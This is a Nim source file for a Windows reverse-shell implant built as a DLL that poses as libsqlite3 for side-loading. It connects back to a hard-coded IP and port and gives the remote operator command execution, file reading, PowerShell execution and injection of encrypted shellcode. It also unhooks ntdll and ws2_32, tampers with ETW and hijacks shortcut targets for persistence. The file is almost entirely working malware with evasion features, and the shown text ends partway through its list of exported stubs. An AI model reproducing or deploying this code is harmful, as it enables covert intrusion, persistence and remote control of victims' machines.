#[
  reverse shell with persistance through shortcuts

  - OPTIONS:
      sc exec via callback:
        .\convert.exe sc.bin -> copy/paste
        [LP_SHELL] > inject ZmM0ODgxZTRmMGZmZm[..snip..]MjJlNjQ2YzZjMDA=

      run PS commands via the System.Management.Automation assembly directly:
        [LP_Shell] > pwsh <commands>
      
      cd, dir, and type run without spawning a child, everything else does
  
  [!] Type 'exit' for a clean exit and shutdown of the connection and process.
  [!] Type 'exit_persist' to exit and set all the target paths on shortcuts to the program.
]#

import core/static_strs 
import core/etw_hwbp
import core/unhk_module
import core/rc_for
import core/lnk_persist
import core/util

import os 
import nimvoke/dinvoke 
import nimvoke/syscalls
from streams import atEnd, readLine
from base64 import decode 
from osproc import startProcess, poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon, outputStream
from strutils import parseInt, parseFloat, splitWhitespace, startsWith, strip, join

from winim/lean import BOOLEAN, WINBOOL, LPCSTR, NULL, FALSE, SIZE_T, HANDLE, ERROR_ALREADY_EXISTS, LPSECURITY_ATTRIBUTES, GetLastError, CloseHandle
import winim/clr except `[]`

proc NimMain() {.cdecl, importc.}

# nim c --app:lib -d:strip --passL:"libsqlite3-0.def" --nomain --cc:gcc --passL:-static --out:libsqlite3-0.dll revshell_sqlite3_t1.nim

#[ [ Edit this ] ]#
let
  portStr: string = jam("8000")
  ipAddr: string = jam("172.16.0.4")
  key: string = jam("test") # rc4 key for sc
  mutexName: string = jam("Global\\qwerty123")
  revShellPath: string = getAppFilename()

const 
  AF_INET = 2
  SOCK_STREAM = 1
  SOCKET_ERROR = -1
  IPPROTO_TCP = 6
  WSADESCRIPTION_LEN = 256
  WSASYS_STATUS_LEN = 128

type
  WSADATA {.pure.} = object
    wVersion*: WORD
    wHighVersion*: WORD
    iMaxSockets*: uint16
    iMaxUdpDg*: uint16
    lpVendorInfo*: ptr char
    szDescription*: array[WSADESCRIPTION_LEN+1, char]
    szSystemStatus*: array[WSASYS_STATUS_LEN+1, char]

type
  hostent {.pure.} = object
    h_name: ptr char 
    h_aliases: ptr ptr char 
    h_addrtype: int16 
    h_length: int16 
    h_addr_list: ptr ptr char

type
  SOCKET = int
  sockaddr {.pure.} = object
  IN_ADDR {.pure.} = object 
    S_addr: int32
  sockaddr_in {.pure.} = object
    sin_family: int16 
    sin_port: uint16 
    sin_addr: IN_ADDR 
    sin_zero: array[8, char]
  PSOCKADDR = ptr sockaddr
  LPWSADATA = ptr WSADATA

const 
  INVALID_SOCKET = SOCKET(-1)

dinvokeDefine(WSAStartup, "ws2_32.dll", proc (wVersionRequired: WORD, lpWSAData: LPWSADATA): int32 {.stdcall.})
dinvokeDefine(WSACleanup, "ws2_32.dll", proc (): int32 {.stdcall.})
dinvokeDefine(socket, "ws2_32.dll", proc (af: int32, `type`: int32, protocol: int32): SOCKET {.stdcall.})
dinvokeDefine(closesocket, "ws2_32.dll", proc (s: SOCKET): int32 {.stdcall.})
dinvokeDefine(htons, "ws2_32.dll", proc (hostshort: uint16): uint16 {.stdcall.})
dinvokeDefine(inet_addr, "ws2_32.dll", proc (cp: ptr char): int32 {.stdcall.})
dinvokeDefine(gethostbyname, "ws2_32.dll", proc (name: ptr char): ptr hostent {.stdcall.})
dinvokeDefine(connect, "ws2_32.dll", proc (s: SOCKET, name: ptr sockaddr, namelen: int32): int32 {.stdcall.})
dinvokeDefine(recv, "ws2_32.dll", proc (s: SOCKET, buf: ptr char, len: int32, flags: int32): int32 {.stdcall.})
dinvokeDefine(send, "ws2_32.dll", proc (s: SOCKET, buf: ptr char, len: int32, flags: int32): int32 {.stdcall.})
dinvokeDefine(EnumDesktopsA, "user32.dll", proc (hwinsta: HWINSTA, lpEnumFunc: DESKTOPENUMPROCA, lParam: LPARAM): WINBOOL {.stdcall.})
dinvokeDefine(CreateMutexA, "kernel32.dll", proc (lpMutexAttributes: LPSECURITY_ATTRIBUTES, bInitialOwner: WINBOOL, lpName: LPCSTR): HANDLE {.stdcall.})

# https://github.com/chvancooten/NimPlant/blob/main/client/commands/risky/powershell.nim
# Run PS commands directly via the System.Management.Automation assembly without calling/spawning powershell.exe
proc execPowershell(psCmd: string): string =
  let 
    Automation = load(jam("System.Management.Automation"))
    RunspaceFactory = Automation.GetType(jam("System.Management.Automation.Runspaces.RunspaceFactory"))
  
  var 
    runspace = @RunspaceFactory.CreateRunspace()
    pipeline = runspace.CreatePipeline()
    result = ""

  runspace.Open()
  pipeline.Commands.AddScript(psCmd)
  pipeline.Commands.Add(jam("Out-String"))

  var pipeOut = pipeline.Invoke()
  for i in countUp(0, pipeOut.Count() - 1):
    result.add($pipeOut.Item(i))
  
  runspace.Dispose()
  return result

proc sqlite3_main_routine() = 
  # Check if running
  var hMutex: HANDLE 
  proc checkMtx(): bool = 
    hMutex = CreateMutexA(NULL, FALSE, mutexName.cstring)
    if GetLastError() == ERROR_ALREADY_EXISTS:
      return false 
    return true 

  if not checkMtx():
    CloseHandle(hMutex)
    return 

  # Restore the original target paths on LNK files
  # User should be able to open intended file/program etc., on second attempt
  restoreOrigLnkPaths()

  discard setHWBPForNTTE()

  var wsaData: WSAData
  if WSAStartup(0x0202, addr wsaData) != 0:
    modifyAllLnkPaths(revShellPath)
    CloseHandle(hMutex)
    return

  var sock: SOCKET = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
  if sock == INVALID_SOCKET:
    discard WSACleanup()
    modifyAllLnkPaths(revShellPath)
    CloseHandle(hMutex)
    return

  let port: int = portStr.parseInt()
  var serverAddr: sockaddr_in
  serverAddr.sin_family = AF_INET
  serverAddr.sin_port = htons(uint16(port))
  serverAddr.sin_addr.S_addr = inet_addr(ipAddr.cstring)

  discard uhkModule(jam("ws2_32.dll"))

  if connect(sock, cast[PSOCKADDR](addr serverAddr), sizeof(serverAddr).cint) == SOCKETERROR:
    discard closesocket(sock)
    discard WSACleanup()
    modifyAllLnkPaths(revShellPath)
    CloseHandle(hMutex)
    return

  let
    base: string = jam("C:\\")
    prompt: string = jam("[LP_SHELL] > ")
    ipMsg: string = jam("[>] Connected to: ")

  let menuStrs: array[8, string] = [
    jam("\n----------------------------------------------------------------------------------\n"),
    jam("[!] Type 'exit' to exit and stop the process without resetting target paths on shortcuts.\n"),
    jam("[!] Type 'exit_persist' to exit and set the target paths back to this binary.\n"),
    jam("----------------------------------------------------------------------------------\n\n"),
    jam("[>] Type 'inject [bin path] [shellcode]' for early cascade injection.\n"),
    jam("[>] Type 'pwsh [commands]' to execute powershell via System.Management.Automation.\n"),
    jam("[>] Built in commands: cd, dir, type"),
    jam("[>] Type '?' to print this message again.\n\n")
  ]

  let
    cd: string = jam("cd")
    dir: string = jam("dir")
    typeF: string = jam("type")
    exit: string = jam("exit")
    exitP: string = jam("exit_persist")
    inj: string = jam("inject")
    pwsh: string = jam("pwsh")
    qMark: string = jam("?")
    fileLabel = jam("[FILE] ")
    dirLabel = jam("[DIR] ")
    lnkFileLabel = jam("[FILE LNK] ")
    lnkDirLabel = jam("[DIR LNK] ")

  var szBuf: array[1024, char]
  let host = cast[ptr hostent](gethostbyname(cast[cstring](addr szBuf[0])))
  let inAddr = cast[ptr array[4, uint8]](host.h_addr_list[])
  let localIP = $inAddr[0] & "." & $inAddr[1] & "." & $inAddr[2] & "." & $inAddr[3]

  let conMsg: string = "\n\n" & ipMsg & localIP & "\n"
  discard send(sock, cast[ptr char](cstring(conMsg)), conMsg.len.cint, 0.cint)
  for ms in menuStrs:
    discard send(sock, cast[ptr char](cstring(ms)), ms.len.cint, 0.cint)

  var recvBuf = newString(8192)
  while true:
    discard send(sock, cast[ptr char](cstring(prompt)), prompt.len.cint, 0.cint)
    let recvLen = recv(sock, addr recvBuf[0], recvBuf.len.cint, 0)
    let cmd = recvBuf[0 .. recvLen-1].strip()

    if cmd.len > 0:
      if cmd.strip() == cd:
        setCurrentDir(base)

      elif cmd.strip().startsWith(cd):
        let dir = cmd.substr(len(cd)).strip()
        try:
          setCurrentDir(dir)
        except OSError as err:
          let errMsg: string = jam("[X] Error: could not change to: ") & dir & " : " & err.msg & "\n"
          discard send(sock, cast[ptr char](cstring(errMsg)), errMsg.len.cint, 0.cint)
          continue
      
      elif cmd.strip().startsWith(dir):
        let dirPath: string = cmd.subStr(len(dir)).strip()
        var
          listRes: string
          effectivePath = if dirPath.len == 0: "." else: dirPath

        for kind, path in walkDir(effectivePath):
          case kind:
            of pcFile:
              listRes.add(fileLabel & path & "\n")
            of pcDir:
              listRes.add(dirLabel & path & "\n")
            of pcLinkToFile:
              listRes.add(lnkFileLabel & path & "\n")
            of pcLinkToDir:
              listRes.add(lnkDirLabel & path & "\n")

        discard send(sock, cast[ptr char](cstring(listRes)), listRes.len.cint, 0.cint)

      elif cmd.strip().startsWith(typeF):
        let targetFile: string = cmd.subStr(len(typeF)).strip()
        if targetFile == "": 
          continue
        else:
          try:
            let fileData = readFile(targetFile)
            const chunkSize = 8192 
            var offset = 0 

            while offset < fileData.len:
              let endIdx = min(offset + chunkSize, fileData.len)
              let chunk = fileData.subStr(offset, endIdx - 1)
              discard send(sock, cast[ptr char](cstring(chunk)), chunk.len.cint, 0.cint)
              offset = endIdx 
          except:
            var typeErr: string = jam("[!] Error on cat/type of selected file\n")
            discard send(sock, cast[ptr char](cstring(typeErr)), typeErr.len.cint, 0.cint)
            continue 
      
      elif cmd.strip().startsWith(inj):
        let 
          injInput: string = cmd.subStr(len(inj)).strip()
          parts = injInput.splitWhitespace()
          encoded = parts[1..^1].join(" ")

        var 
          decoded: string = decode(encoded)
          dsc = frcDec(key, decoded)
          sc: seq[byte] = toByteSeq(dsc)
        
        discard uhkModule(jam("ntdll.dll"))
        var
          status   : NTSTATUS
          baseAddr : PVOID 
          hProc    : HANDLE = 0xFFFFFFFFFFFFFFFF
          scSize   : SIZE_T = sc.len.SIZE_T 
        
        status = syscall(NtAllocateVirtualMemory, hProc, &baseAddr, 0, &scSize, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
        if not NT_SUCCESS(status):
          continue

        var bytesWritten: SIZE_T
        status = syscall(ZwWriteVirtualMemory, hProc, baseAddr, &sc[0], scSize.SIZE_T, cast[PSIZE_T](&bytesWritten))
        if not NT_SUCCESS(status):
          continue 

        var oldProtect: DWORD
        status = syscall(ZwProtectVirtualMemory, hProc, &baseAddr, &scSize, PAGE_EXECUTE_READ, &oldProtect)
        if not NT_SUCCESS(status):
          continue 

        discard EnumDesktopsA(GetProcessWindowStation(), cast[DESKTOPENUMPROCA](baseAddr), cast[LPARAM](NULL))
        continue 
      
      elif cmd.strip().startsWith(pwsh):
        let psCmd: string = cmd.subStr(len(pwsh)).strip()
        let psOutput: string = execPowershell(psCmd)
        discard send(sock, cast[ptr char](cstring(psOutput)), psOutput.len.cint, 0.cint)
      
      elif cmd.strip().startsWith(qMark):
        for ms in menuStrs:
          discard send(sock, cast[ptr char](cstring(ms)), ms.len.cint, 0.cint)
      
      # Exit and set target paths on shortcuts to the signed PE for sideloading
      elif cmd.strip().startsWith(exitP):
        discard closesocket(sock)
        discard WSACleanup()
        modifyAllLnkPaths(revShellPath)
        CloseHandle(hMutex)
        return 

      # Cleanup and exit, keeping target paths as intended
      elif cmd.strip().startsWith(exit):
        discard closesocket(sock)
        discard WSACleanup()
        CloseHandle(hMutex)
        return 
      
      # Default cmd exec (naughty)
      else:
        let process = startProcess(cmd, options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
        #defer: process.close()

        var execRes = "" 
        if process.outputStream != nil:
          while not process.outputStream.atEnd():
            execRes.add(process.outputStream.readLine())
            execRes.add("\n")
        discard send(sock, cast[ptr char](cstring(execRes)), execRes.len.cint, 0.cint)

  discard closesocket(sock)
  discard WSACleanup()
  CloseHandle(hMutex)
  return

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
  if fdwReason == DLL_PROCESS_ATTACH:
    NimMain()
  return true 

proc `sqlite3_aggregate_context`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_aggregate_count`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_auto_extension`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_backup_finish`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_backup_init`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_backup_pagecount`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_backup_remaining`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_backup_step`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_blob`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_blob64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_double`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bin_int`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_int64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_null`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_parameter_count`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_parameter_index`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_parameter_name`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_pointer`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_text`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_text16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_text64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_value`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_zeroblob`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_bind_zeroblob64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_blob_bytes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_blob_close`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_blob_open`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_blob_read`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_blob_reopen`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_blob_write`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_busy_handler`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_busy_timeout`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_cancel_auto_extension`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_changes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_clear_bindings`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_close`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_close_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_collation_needed`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_collation_needed16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_blob`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_bytes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_byte16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_count`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_database_name`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_database_name16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_decltype`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_decltype16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_double`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_int`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_int64`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_name`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_name16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_origin_name`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_origin_name16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_table_name`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_table_name16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_text`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_text16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_type`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_column_value`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_commit_hook`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_comileoption_get`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_compileoption_used`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_complete`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_complete16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_config`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_context_db_handle`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_collation`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_collation16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_collation_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_function`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_function16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_function_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_module`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_module_v2`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_create_window_function`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_data_count`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_data_directory`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_db_cacheflush`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true  

proc `sqlite3_db_config`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_db_filename`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true

proc `sqlite3_db_handle`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_db_mutex`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_db_readonly`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_db_release_memory`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_db_status`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_declare_vtab`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_enable_load_extension`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_enable_shared_cache`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_errcode`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_errmsg`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_errmsg16`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_errstr`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_exec`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_expanded_sql`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_expired`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_extended_errcode`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_extended_result_codes`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_file_control`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
  return true 

proc `sqlite3_finalize`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
  NimMain()
